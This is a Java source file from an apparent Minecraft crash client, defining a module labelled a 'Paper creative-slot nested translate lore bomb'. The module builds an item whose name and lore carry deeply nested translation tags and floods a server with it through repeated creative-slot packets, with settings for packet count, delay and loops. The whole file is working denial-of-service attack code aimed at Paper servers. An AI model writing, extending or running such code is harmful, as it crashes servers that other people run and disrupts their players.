package me.dannycrasher.client.module.impl.paper;

import com.viaversion.viafabricplus.ViaFabricPlus;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ScheduledExecutorService;
import me.dannycrasher.client.command.ArgumentType;
import me.dannycrasher.client.module.Module;
import me.dannycrasher.client.module.ModuleContext;
import me.dannycrasher.client.module.ModuleType;
import me.dannycrasher.client.module.impl.crash.NbtBombTrees;
import me.dannycrasher.client.protocol.components.data.DataComponents;
import me.dannycrasher.client.protocol.components.data.impl.DataItemName;
import me.dannycrasher.client.protocol.components.data.impl.DataLore;
import me.dannycrasher.client.protocol.components.objects.ItemStack;
import me.dannycrasher.client.protocol.components.objects.ItemType;
import net.minecraft.nbt.Tag;

public class CreativeTranslateLore extends Module {
	private ScheduledExecutorService executorService;

	public CreativeTranslateLore() {
		super("CreativeTranslateLore", "Paper creative-slot nested translate lore bomb (requires creative)", ModuleType.PAPER);
		addArgument("packets", ArgumentType.INT, 1, 1000, "50");
		addArgument("lineCount", ArgumentType.INT, 1, 256, "32");
		addArgument("chars", ArgumentType.INT, 1, 100, "40");
		addArgument("slot", ArgumentType.INT, 0, 45, "36");
		addArgument("threadSleep", ArgumentType.INT, 1, 5000, "1000");
		addArgument("loopAmount", ArgumentType.INT, 1, 5000, "5");
	}

	@Override
	public void executeModule(ModuleContext context) {
		int protocol = ViaFabricPlus.getImpl().getTargetVersion().getVersion();
		Tag nested = NbtBombTrees.translateNest(context.getInt("chars"));
		List<Tag> lines = new ArrayList<>();
		for (int i = 0; i < context.getInt("lineCount"); i++) {
			lines.add(nested);
		}

		DataComponents components = new DataComponents();
		components.put(new DataLore(lines));
		components.put(new DataItemName(nested));
		ItemStack item = new ItemStack(ItemType.STONE.getId(protocol), 1, components);
		executorService = CreativeAttackHelper.start(
				this, context, executorService,
				context.getInt("packets"), context.getInt("threadSleep"), context.getInt("loopAmount"),
				context.getInt("slot"), item
		);
	}

	@Override
	public void onDisconnect() {
		super.onDisconnect();
		CreativeAttackHelper.shutdown(executorService);
	}
}
